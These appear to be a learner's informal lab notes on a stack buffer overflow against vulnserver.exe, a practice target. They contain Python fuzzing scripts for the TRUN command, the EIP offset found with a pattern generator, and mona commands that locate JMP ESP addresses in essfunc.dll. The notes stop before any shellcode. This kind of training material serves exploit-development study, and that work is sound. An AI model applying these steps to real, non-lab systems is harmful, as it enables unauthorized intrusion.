### Freaking heck mane. 
```bash
static analysis
strings.exe vulnserver.exe
or strings .\vulnserver.exe | select -First 10
*If it cannot be run in DOS Mode, it is likely a windows executable.
Run vulnserver.exe as administrator
Get-Process | findstr /i vuln
*Pid is 12000
netstat -anop tcp | findstr 12000
*Port 9999 is listening.
Go to linux, create this script:
#!/usr/bin/python
import socket

### FUZZ ###
buf = ""
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.
Run it
We recieve: Welcome to Vulnerable Server! Enter HELP for help.
Go back, edit buf on script to = HELP
Now when we run, we recieve:
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
#We want to use TRUN
Edit script:
#!/usr/bin/python
import socket

### FUZZ ###
buf = "TRUN /.:/"
buf += "A" * 100
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Create IPv4 socket, TCP protocol
s.connect (("10.50.179.49", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response 
s.send(buf) #Send the value of buf
print s.recv(1024) #Print response
s.close() #close the socket.
#We recieved: TRUN COMPLETE
Edit the script, change line to this:
buf += "A" * 1000
#Still displays TRUN COMPLETE, try to break it. We are upping the 1000 to 3000.
#it displays nothing, hinting at being bricked. We see 414141414141 in EBP on immunity debugger
Go to wiremask.eu Buffer overflow generator. We used 3000, enter and moove
# out the line that says buf += "A" ... and change A to the string generated by wiremask.
Reset debugger, run again. A value in EIP appears, 386F4337, copy and paste into wiremask offset generator. we get 2003.
#Delete the line, use :d1 to delete the long ass string.
Change script lines to this: (We un # ts)
 buf += "A" * 2003 # offset
buf += "BBBB" # show we hit our EIP.
Run again.


#Dynamic
Run immunity as Administrator > Open.exe > play, rewind, repeat
Fuzzing > Wiremask > Find offset

!mona modules #Find unprotected DLLS
!mona jmp -r esp -m "essfinc.dll" #Search for JMP ESP with unprotected DLL
#window > Log Data

#MSF CONSOLE
msfconsole

In immunity debugger, tyoe !mona modules
#We will use the one with all FALSE set.
#We identified essfunc.dll as a contender for the all false.
Enter: !mona jmp -r esp -m "essfunc.dll" #Click window at the top bar, then click Log Data. Then we go to our results, and right clip copy to keyboard our numbers.
625011AF
625011BB
625011C7
625011D3



